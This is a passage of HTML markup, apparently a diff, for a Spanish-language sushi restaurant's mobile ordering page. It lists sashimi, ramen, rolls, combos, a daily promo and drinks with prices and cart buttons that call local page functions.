+<div class="phone-block" data-id="b3" style="outline: none;"><div class="b-ticker fw" style="background:#ff0000;border-radius:0" data-ticker="b3"><div class="ticker-track"><div class="ticker-inner" id="ticker-inner-b3" data-text="🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · " data-speed="60" style="color: rgb(255, 255, 255); transform: translateX(-1359.36px);"><span style="color: rgb(255, 255, 255); padding-right: 28px; display: inline-block;">🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·    </span><span style="color: rgb(255, 255, 255); padding-right: 28px; display: inline-block;">🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·    </span><span style="color: rgb(255, 255, 255); padding-right: 28px; display: inline-block;">🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·    </span><span style="color: rgb(255, 255, 255); padding-right: 28px; display: inline-block;">🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·    </span><span style="color: rgb(255, 255, 255); padding-right: 28px; display: inline-block;">🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·    </span><span style="color: rgb(255, 255, 255); padding-right: 28px; display: inline-block;">🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·    </span><span style="color: rgb(255, 255, 255); padding-right: 28px; display: inline-block;">🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·    </span><span style="color: rgb(255, 255, 255); padding-right: 28px; display: inline-block;">🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·    </span><span style="color: rgb(255, 255, 255); padding-right: 28px; display: inline-block;">🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·    </span><span style="color: rgb(255, 255, 255); padding-right: 28px; display: inline-block;">🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·    </span><span style="color: rgb(255, 255, 255); padding-right: 28px; display: inline-block;">🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·    </span><span style="color: rgb(255, 255, 255); padding-right: 28px; display: inline-block;">🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·    </span><span style="color: rgb(255, 255, 255); padding-right: 28px; display: inline-block;">🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·    </span><span style="color: rgb(255, 255, 255); padding-right: 28px; display: inline-block;">🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·    </span><span style="color: rgb(255, 255, 255); padding-right: 28px; display: inline-block;">🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·    </span><span style="color: rgb(255, 255, 255); padding-right: 28px; display: inline-block;">🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp · 🍣 Delivery gratis desde €25 · Ingredientes frescos cada día · Pedidos directo por WhatsApp ·    </span></div></div></div></div>
+<div class="phone-block" data-id="b4" style="outline: none;"><div class="b-heading" style="background:transparent"><h2 class="heading-text" style="font-size:24px;color:#f7f7f7;text-align:center;line-height:1.2;">Entradas</h2></div></div>
+<div class="phone-block" data-id="b5" style="outline: none;"><div class="b-gridproductswindow"><h4 style="color:#ffffff">Sashimi</h4><div class="gpw-grid"><div class="gpw-card"><div class="gpw-bg" style="background-image:url('images/img4.png')"></div><div class="gpw-info"><div class="gpw-text"><div class="gpw-cat">4 unidades</div><div class="gpw-name">Sashimi Lubina</div><div class="gpw-price">3.99</div></div><button class="gpw-more" style="background:#c1272d;color:#ffffff" onclick="openGPWModal('b5','Sashimi Lubina','4 unidades','3.99','4 piezas de pez lubina fresca','images/img4.png','b5_0');event.stopPropagation()">Ver más</button></div></div><div class="gpw-card"><div class="gpw-bg" style="background-image:url('images/img5.png')"></div><div class="gpw-info"><div class="gpw-text"><div class="gpw-cat">4 unidades</div><div class="gpw-name">Sashimi Pulpo y Calamar</div><div class="gpw-price">4.99</div></div><button class="gpw-more" style="background:#c1272d;color:#ffffff" onclick="openGPWModal('b5','Sashimi Pulpo y Calamar','4 unidades','4.99','2 piezas de calamar y 2 piezas de pulpo fresco','images/img5.png','b5_1');event.stopPropagation()">Ver más</button></div></div><div class="gpw-card"><div class="gpw-bg" style="background-image:url('images/img6.png')"></div><div class="gpw-info"><div class="gpw-text"><div class="gpw-cat">4 unidades</div><div class="gpw-name">Sashimi Salmón</div><div class="gpw-price">3.49</div></div><button class="gpw-more" style="background:#c1272d;color:#ffffff" onclick="openGPWModal('b5','Sashimi Salmón','4 unidades','3.49','4 piezas de salmón fresco','images/img6.png','b5_2');event.stopPropagation()">Ver más</button></div></div><div class="gpw-card"><div class="gpw-bg" style="background-image:url('images/img7.png')"></div><div class="gpw-info"><div class="gpw-text"><div class="gpw-cat">4 unidades</div><div class="gpw-name">Sashimi Pez Mantequilla</div><div class="gpw-price">4.99</div></div><button class="gpw-more" style="background:#c1272d;color:#ffffff" onclick="openGPWModal('b5','Sashimi Pez Mantequilla','4 unidades','4.99','4 piezas de pez suave y fresco','images/img7.png','b5_3');event.stopPropagation()">Ver más</button></div></div></div></div>
+    
+    </div>
+<div class="phone-block" data-id="b24" style="outline: none;"><div class="b-heading" style="background:transparent"><h2 class="heading-text" style="font-size:17px;color:#f7f7f7;text-align:left;line-height:1.2;">Especialidades del Chef</h2></div></div>
+<div class="phone-block" data-id="b23" style="outline: none;"><div class="b-foodstack"><div class="stack-wrap"><div class="stack-container" id="fstack-b23"><div class="tarjeta-stack atras-2" style="background: rgb(52, 52, 55); color: rgb(255, 255, 255);"><div class="stack-img-wrap"><img src="images/img8.jpg" alt="Ramen de pollo, verduras y huevo"></div><div class="stack-info"><h3 style="color:#ffffff">Ramen de pollo, verduras y huevo</h3><div class="stack-meta" style="color:#ffffff"><span class="rating-s">★ 4.8</span></div></div><button class="stack-cart-btn" style="background:#c1272d;color:#ffffff" onclick="addToCart('b23-2','Ramen de pollo, verduras y huevo','4.99','images/img8.jpg');event.stopPropagation()">🛒 €4.99 · Agregar</button></div><div class="tarjeta-stack atras-1" style="background: rgb(52, 52, 55); color: rgb(255, 255, 255);"><div class="stack-img-wrap"><img src="images/img9.jpg" alt="Gyoza de cerdo y cebollino a la plancha. (4 unidades)"></div><div class="stack-info"><h3 style="color:#ffffff">Gyoza de cerdo y cebollino a la plancha. (4 unidades)</h3><div class="stack-meta" style="color:#ffffff"><span class="rating-s">★ 4.2</span></div></div><button class="stack-cart-btn" style="background:#c1272d;color:#ffffff" onclick="addToCart('b23-1','Gyoza de cerdo y cebollino a la plancha. (4 unidades)','3.99','images/img9.jpg');event.stopPropagation()">🛒 €3.99 · Agregar</button></div><div class="tarjeta-stack al-frente" style="background: rgb(52, 52, 55); color: rgb(255, 255, 255);"><div class="stack-img-wrap"><img src="images/img10.webp" alt="Sopa Miso, tofu y soba"></div><div class="stack-info"><h3 style="color:#ffffff">Sopa Miso, tofu y soba</h3><div class="stack-meta" style="color:#ffffff"><span class="rating-s">★ 4.7</span></div></div><button class="stack-cart-btn" style="background:#c1272d;color:#ffffff" onclick="addToCart('b23-0','Sopa Miso, tofu y soba','4.50','images/img10.webp');event.stopPropagation()">🛒 €4.50 · Agregar</button></div></div><button type="button" class="stack-arrow stack-arrow-left" onclick="foodStackNav('b23',-1);event.stopPropagation()"><i class="ti ti-chevron-left"></i></button><button type="button" class="stack-arrow stack-arrow-right" onclick="foodStackNav('b23',1);event.stopPropagation()"><i class="ti ti-chevron-right"></i></button></div><div class="stack-hint">← Desliza o usa las flechas →</div></div></div>
+<div class="phone-block" data-id="b6" style="outline: none;"><div class="b-image" style="background:transparent"><img loading="lazy" src="images/img11.png" alt=""></div></div>
+<div class="phone-block" data-id="b7" style="outline: none;"><div class="b-heading" style="background:transparent"><h2 class="heading-text" style="font-size:24px;color:#f7f7f7;text-align:center;line-height:1.2;">Rollos Clásicos</h2></div></div>
+<div class="phone-block" data-id="b30" style="outline: none;"><div class="b-productvariants" style="background:#1c1c1e">
+      <div class="pv-images" style="background:#1c1c1e"><img src="images/img12.jpg" alt="California Roll"></div>
+      <div class="pv-info">
+        <div class="pv-name" style="color:#ffffff">California Roll</div>
+        <div class="pv-desc" style="color:#e6e6e6">Kanikama y aguacate, cubierto con ajonjolí tostado.</div>
+      </div>
+      <div class="pv-variants" id="pv-variants-b30">
+      <div class="pv-variant" style="--pv-selected:#ff9500;--pv-bg:#424242;--pv-selected-bg:#ff0000" onclick="selectVariant('b30',0,this)">
+        <span class="pv-variant-label" style="color:#ffffff">Medio Rollo</span>
+        <span class="pv-variant-price" style="color:#ffffff">€5.99</span>
+      </div>
+      <div class="pv-variant" style="--pv-selected:#ff9500;--pv-bg:#424242;--pv-selected-bg:#ff0000" onclick="selectVariant('b30',1,this)">
+        <span class="pv-variant-label" style="color:#ffffff">Rollo Completo</span>
+        <span class="pv-variant-price" style="color:#ffffff">€9.99</span>
+      </div></div>
+      <button class="pv-buy" id="pv-buy-b30" style="background:#c1272d;color:#ffffff" onclick="addVariantToCart('b30');event.stopPropagation()">Agregar al carrito</button>
+    </div></div>
+<div class="phone-block" data-id="b9" style="outline: none;"><div class="b-productvariants" style="background:#1c1c1e">
+      <div class="pv-images" style="background:#1c1c1e"><img src="images/img13.jpg" alt="Dragon Roll"></div>
+      <div class="pv-info">
+        <div class="pv-name" style="color:#ffffff">Dragon Roll</div>
+        <div class="pv-desc" style="color:#e6e6e6">Camarón tempura, aguacate y anguila glaseada por encima.</div>
+      </div>
+      <div class="pv-variants" id="pv-variants-b9">
+      <div class="pv-variant" style="--pv-selected:#ff9500;--pv-bg:#424242;--pv-selected-bg:#ff0000" onclick="selectVariant('b9',0,this)">
+        <span class="pv-variant-label" style="color:#ffffff">Medio Rollo</span>
+        <span class="pv-variant-price" style="color:#ffffff">€6.49</span>
+      </div>
+      <div class="pv-variant" style="--pv-selected:#ff9500;--pv-bg:#424242;--pv-selected-bg:#ff0000" onclick="selectVariant('b9',1,this)">
+        <span class="pv-variant-label" style="color:#ffffff">Rollo Completo</span>
+        <span class="pv-variant-price" style="color:#ffffff">€9.99</span>
+      </div></div>
+      <button class="pv-buy" id="pv-buy-b9" style="background:#c1272d;color:#ffffff" onclick="addVariantToCart('b9');event.stopPropagation()">Agregar al carrito</button>
+    </div></div>
+<div class="phone-block" data-id="b10" style="outline: none;"><div class="b-productvariants" style="background:#1c1c1e">
+      <div class="pv-images" style="background:#1c1c1e"><img src="images/img14.png" alt="Philadelphia Roll"></div>
+      <div class="pv-info">
+        <div class="pv-name" style="color:#ffffff">Philadelphia Roll</div>
+        <div class="pv-desc" style="color:#e6e6e6">Salmón fresco, queso crema y aguacate, envuelto en ajonjolí.</div>
+      </div>
+      <div class="pv-variants" id="pv-variants-b10">
+      <div class="pv-variant" style="--pv-selected:#ff9500;--pv-bg:#424242;--pv-selected-bg:#ff0000" onclick="selectVariant('b10',0,this)">
+        <span class="pv-variant-label" style="color:#ffffff">Medio Rollo</span>
+        <span class="pv-variant-price" style="color:#ffffff">€5.99</span>
+      </div>
+      <div class="pv-variant" style="--pv-selected:#ff9500;--pv-bg:#424242;--pv-selected-bg:#ff0000" onclick="selectVariant('b10',1,this)">
+        <span class="pv-variant-label" style="color:#ffffff">Rollo Completo</span>
+        <span class="pv-variant-price" style="color:#ffffff">€9.99</span>
+      </div></div>
+      <button class="pv-buy" id="pv-buy-b10" style="background:#c1272d;color:#ffffff" onclick="addVariantToCart('b10');event.stopPropagation()">Agregar al carrito</button>
+    </div></div>
+<div class="phone-block" data-id="b11" style="outline: none;"><div class="b-productvariants" style="background:#1c1c1e">
+      <div class="pv-images" style="background:#1c1c1e"><img src="images/img15.webp" alt="Rainbow Roll"></div>
+      <div class="pv-info">
+        <div class="pv-name" style="color:#ffffff">Rainbow Roll</div>
+        <div class="pv-desc" style="color:#e6e6e6">Alga nori, pepino, aguacate y kanikama</div>
+      </div>
+      <div class="pv-variants" id="pv-variants-b11">
+      <div class="pv-variant" style="--pv-selected:#ff9500;--pv-bg:#424242;--pv-selected-bg:#ff0000" onclick="selectVariant('b11',0,this)">
+        <span class="pv-variant-label" style="color:#ffffff">Medio Rollo</span>
+        <span class="pv-variant-price" style="color:#ffffff">€5.99</span>
+      </div>
+      <div class="pv-variant" style="--pv-selected:#ff9500;--pv-bg:#424242;--pv-selected-bg:#ff0000" onclick="selectVariant('b11',1,this)">
+        <span class="pv-variant-label" style="color:#ffffff">Rollo Completo</span>
+        <span class="pv-variant-price" style="color:#ffffff">€9.99</span>
+      </div></div>
+      <button class="pv-buy" id="pv-buy-b11" style="background:#c1272d;color:#ffffff" onclick="addVariantToCart('b11');event.stopPropagation()">Agregar al carrito</button>
+    </div></div>
+<div class="phone-block" data-id="b12" style="outline: none;"><div class="b-heading" style="background:transparent"><h2 class="heading-text" style="font-size:24px;color:#fafafa;text-align:center;line-height:1.2;">Rollos Especiales</h2></div></div>
+<div class="phone-block" data-id="b13" style="outline: none;"><div class="b-productvariants" style="background:#1c1c1e">
+      <div class="pv-images" style="background:#1c1c1e"><img src="images/img16.webp" alt="Tiger Eye Roll"></div>
+      <div class="pv-info">
+        <div class="pv-name" style="color:#ffffff">Tiger Eye Roll</div>
+        <div class="pv-desc" style="color:#e6e6e6">Camarón Tempura, queso crema, jalapeño y salmón con masago y ajonjolí tostado.</div>
+      </div>
+      <div class="pv-variants" id="pv-variants-b13">
+      <div class="pv-variant" style="--pv-selected:#ff9500;--pv-bg:#424242;--pv-selected-bg:#ff0000" onclick="selectVariant('b13',0,this)">
+        <span class="pv-variant-label" style="color:#ffffff">Medio Rollo</span>
+        <span class="pv-variant-price" style="color:#ffffff">€6.99</span>
+      </div>
+      <div class="pv-variant" style="--pv-selected:#ff9500;--pv-bg:#424242;--pv-selected-bg:#ff0000" onclick="selectVariant('b13',1,this)">
+        <span class="pv-variant-label" style="color:#ffffff">Rollo Completo</span>
+        <span class="pv-variant-price" style="color:#ffffff">€10.99</span>
+      </div></div>
+      <button class="pv-buy" id="pv-buy-b13" style="background:#c1272d;color:#ffffff" onclick="addVariantToCart('b13');event.stopPropagation()">Agregar al carrito</button>
+    </div></div>
+<div class="phone-block" data-id="b14" style="outline: none;"><div class="b-productvariants" style="background:#1c1c1e">
+      <div class="pv-images" style="background:#1c1c1e"><img src="images/img17.jpg" alt="Kani Maracuyá Roll"></div>
+      <div class="pv-info">
+        <div class="pv-name" style="color:#ffffff">Kani Maracuyá Roll</div>
+        <div class="pv-desc" style="color:#e6e6e6">Camarón con queso crema, bañado en salsa de maracuyá y ajonjolí tostado.</div>
+      </div>
+      <div class="pv-variants" id="pv-variants-b14">
+      <div class="pv-variant" style="--pv-selected:#ff9500;--pv-bg:#424242;--pv-selected-bg:#ff0000" onclick="selectVariant('b14',0,this)">
+        <span class="pv-variant-label" style="color:#ffffff">Medio Rollo</span>
+        <span class="pv-variant-price" style="color:#ffffff">€6.99</span>
+      </div>
+      <div class="pv-variant" style="--pv-selected:#ff9500;--pv-bg:#424242;--pv-selected-bg:#ff0000" onclick="selectVariant('b14',1,this)">
+        <span class="pv-variant-label" style="color:#ffffff">Rollo Completo</span>
+        <span class="pv-variant-price" style="color:#ffffff">€10.99</span>
+      </div></div>
+      <button class="pv-buy" id="pv-buy-b14" style="background:#c1272d;color:#ffffff" onclick="addVariantToCart('b14');event.stopPropagation()">Agregar al carrito</button>
+    </div></div>
+<div class="phone-block" data-id="b16" style="outline: none;"><div class="b-productvariants" style="background:#1c1c1e">
+      <div class="pv-images" style="background:#1c1c1e"><img src="images/img18.jpg" alt="Sunset Roll"></div>
+      <div class="pv-info">
+        <div class="pv-name" style="color:#ffffff">Sunset Roll</div>
+        <div class="pv-desc" style="color:#e6e6e6">Mango, salmón y aguacate con salmón desmenuzado, queso crema y cebollino</div>
+      </div>
+      <div class="pv-variants" id="pv-variants-b16">
+      <div class="pv-variant" style="--pv-selected:#ff9500;--pv-bg:#424242;--pv-selected-bg:#ff0000" onclick="selectVariant('b16',0,this)">
+        <span class="pv-variant-label" style="color:#ffffff">Medio Rollo</span>
+        <span class="pv-variant-price" style="color:#ffffff">€7.99</span>
+      </div>
+      <div class="pv-variant" style="--pv-selected:#ff9500;--pv-bg:#424242;--pv-selected-bg:#ff0000" onclick="selectVariant('b16',1,this)">
+        <span class="pv-variant-label" style="color:#ffffff">Rollo Completo</span>
+        <span class="pv-variant-price" style="color:#ffffff">€11.99</span>
+      </div></div>
+      <button class="pv-buy" id="pv-buy-b16" style="background:#c1272d;color:#ffffff" onclick="addVariantToCart('b16');event.stopPropagation()">Agregar al carrito</button>
+    </div></div>
+<div class="phone-block" data-id="b15" style="outline: none;"><div class="b-productvariants" style="background:#1c1c1e">
+      <div class="pv-images" style="background:#1c1c1e"><img src="images/img19.png" alt="Uramaki Salmón Tostado Roll"></div>
+      <div class="pv-info">
+        <div class="pv-name" style="color:#ffffff">Uramaki Salmón Tostado Roll</div>
+        <div class="pv-desc" style="color:#e6e6e6">Salmón flameado, alga nori, aguacate, pepino, queso crema y salsa unagi</div>
+      </div>
+      <div class="pv-variants" id="pv-variants-b15">
+      <div class="pv-variant" style="--pv-selected:#ff9500;--pv-bg:#424242;--pv-selected-bg:#ff0000" onclick="selectVariant('b15',0,this)">
+        <span class="pv-variant-label" style="color:#ffffff">Medio Rollo</span>
+        <span class="pv-variant-price" style="color:#ffffff">€6.99</span>
+      </div>
+      <div class="pv-variant" style="--pv-selected:#ff9500;--pv-bg:#424242;--pv-selected-bg:#ff0000" onclick="selectVariant('b15',1,this)">
+        <span class="pv-variant-label" style="color:#ffffff">Rollo Completo</span>
+        <span class="pv-variant-price" style="color:#ffffff">€10.99</span>
+      </div></div>
+      <button class="pv-buy" id="pv-buy-b15" style="background:#c1272d;color:#ffffff" onclick="addVariantToCart('b15');event.stopPropagation()">Agregar al carrito</button>
+    </div></div>
+<div class="phone-block" data-id="b20" style="outline: none;"><div class="b-image" style="background:transparent"><img loading="lazy" src="images/img20.png" alt=""></div></div>
+<div class="phone-block" data-id="b41" style="outline: none;"><div class="b-combo" style="background:#1c1c1e" onclick="openComboModal('b41')">
+      <img class="combo-img combo-img-sq" src="images/img21.jpg" alt="Combo 2 personas (2 rollos clásicos enteros y 2 medios rollos especiales)">
+      <div class="combo-info">
+        <div class="combo-name" style="color:#ffffff">Combo 2 personas (2 rollos clásicos enteros y 2 medios rollos especiales)</div>
+        <div class="combo-price" style="color:#ffffff">$19.99</div>
+      </div>
+      <button class="combo-btn" style="background:#c1272d;color:#ffffff" onclick="openComboModal('b41');event.stopPropagation()">Elegir rollos</button>
+    </div>
+    
+    </div>
+<div class="phone-block" data-id="b42" style="outline: none;"><div class="b-heading" style="background:transparent"><h2 class="heading-text" style="font-size:12px;color:#c1272d;text-align:left;line-height:1.2;">🍣 El más pedido ↓ ↓ ↓</h2></div></div>
+<div class="phone-block" data-id="b34" style="outline: none;"><div class="b-combo" style="background:#1c1c1e" onclick="openComboModal('b34')">
+      <img class="combo-img combo-img-sq" src="images/img22.jpg" alt="Combo 3 personas (3 rollos clásicos enteros y 3 medios rollos especiales) + 3 gaseosas personales">
+      <div class="combo-info">
+        <div class="combo-name" style="color:#ffffff">Combo 3 personas (3 rollos clásicos enteros y 3 medios rollos especiales) + 3 gaseosas personales</div>
+        <div class="combo-price" style="color:#ffffff">$27.99</div>
+      </div>
+      <button class="combo-btn" style="background:#c1272d;color:#ffffff" onclick="openComboModal('b34');event.stopPropagation()">Elegir rollos</button>
+    </div>
+    
+    </div>
+<div class="phone-block" data-id="b40" style="outline: none;"><div class="b-combo" style="background:#1c1c1e" onclick="openComboModal('b40')">
+      <img class="combo-img combo-img-sq" src="images/img23.webp" alt="Combo 4 personas (5 rollos enteros)">
+      <div class="combo-info">
+        <div class="combo-name" style="color:#ffffff">Combo 4 personas (5 rollos enteros)</div>
+        <div class="combo-price" style="color:#ffffff">$34.99</div>
+      </div>
+      <button class="combo-btn" style="background:#c1272d;color:#ffffff" onclick="openComboModal('b40');event.stopPropagation()">Elegir rollos</button>
+    </div>
+    
+    </div>
+<div class="phone-block" data-id="b29" style="outline: none;"><div class="b-image fw" style="background:transparent"><img loading="lazy" src="images/img24.png" alt=""></div></div>
+<div class="phone-block" data-id="b39" style="outline: none;"><div class="b-text" style="background:transparent;color:#ffffff;line-height:1.2;">En las PROMOS DEL DÍA apararecen todos los platos con oferta vigente, si no ves ninguna promo es porque a esta hora no está disponible. Así que aprovecha cuando las encuentres.</div></div>
+<div class="phone-block" data-id="b38" style="outline: none;"><div class="b-combo b-promo" data-owner="b38" data-promo-days="1,2,3,4,5,6,0" data-promo-start="08:00" data-promo-end="20:00" style="background:#c1272d" onclick="openComboModal('b38')">
+      <img class="combo-img combo-img-sq" src="images/img25.webp" alt="Promo del Día: Explosión de 25 Rollitos a la orden + 1 Sashimi">
+      <div class="combo-info">
+        <div class="combo-name-row"><span class="combo-name" style="color:#ffffff">Promo del Día: Explosión de 25 Rollitos a la orden + 1 Sashimi</span><span class="promo-badge" id="promo-badge-b38">⏱ Termina en 55m</span></div>
+        <div class="combo-price" style="color:#ffffff">$9.99</div>
+      </div>
+      <button class="combo-btn" style="background:#ffffff;color:#c1272d" onclick="openComboModal('b38');event.stopPropagation()">Combina tu orden</button>
+    </div>
+    
+    </div>
+<div class="phone-block" data-id="b22" style="outline: none;"><div class="b-gridproductswindow"><h4 style="color:#ffffff">Bebidas</h4><div class="gpw-grid"><div class="gpw-card"><div class="gpw-bg" style="background-image:url('images/img26.webp')"></div><div class="gpw-info"><div class="gpw-text"><div class="gpw-cat">Gaseosa</div><div class="gpw-name">Coca Cola personal</div><div class="gpw-price">1.99</div></div><button class="gpw-more" style="background:#c1272d;color:#ffffff" onclick="openGPWModal('b22','Coca Cola personal','Gaseosa','1.99','Coca Cola personal','images/img26.webp','b22_0');event.stopPropagation()">Ver más</button></div></div><div class="gpw-card"><div class="gpw-bg" style="background-image:url('images/img27.webp')"></div><div class="gpw-info"><div class="gpw-text"><div class="gpw-cat">Gaseosa</div><div class="gpw-name">Fanta Personal</div><div class="gpw-price">1.99</div></div><button class="gpw-more" style="background:#c1272d;color:#ffffff" onclick="openGPWModal('b22','Fanta Personal','Gaseosa','1.99','Fanta Personal','images/img27.webp','b22_1');event.stopPropagation()">Ver más</button></div></div><div class="gpw-card"><div class="gpw-bg" style="background-image:url('images/img28.webp')"></div><div class="gpw-info"><div class="gpw-text"><div class="gpw-cat">Gaseosa</div><div class="gpw-name">Sprite Personal</div><div class="gpw-price">1.99</div></div><button class="gpw-more" style="background:#c1272d;color:#ffffff" onclick="openGPWModal('b22','Sprite Personal','Gaseosa','1.99','Sprite Personal','images/img28.webp','b22_2');event.stopPropagation()">Ver más</button></div></div><div class="gpw-card"><div class="gpw-bg" style="background-image:url('images/img29.webp')"></div><div class="gpw-info"><div class="gpw-text"><div class="gpw-cat">Gaseosa</div><div class="gpw-name">Aquarius Manzana Personal</div><div class="gpw-price">1.99</div></div><button class="gpw-more" style="background:#c1272d;color:#ffffff" onclick="openGPWModal('b22','Aquarius Manzana Personal','Gaseosa','1.99','Aquarius Manzana Personal','images/img29.webp','b22_3');event.stopPropagation()">Ver más</button></div></div><div class="gpw-card"><div class="gpw-bg" style="background-image:url('images/img30.jpg')"></div><div class="gpw-info"><div class="gpw-text"><div class="gpw-cat">Agua</div><div class="gpw-name">Font Vella personal</div><div class="gpw-price">1.25</div></div><button 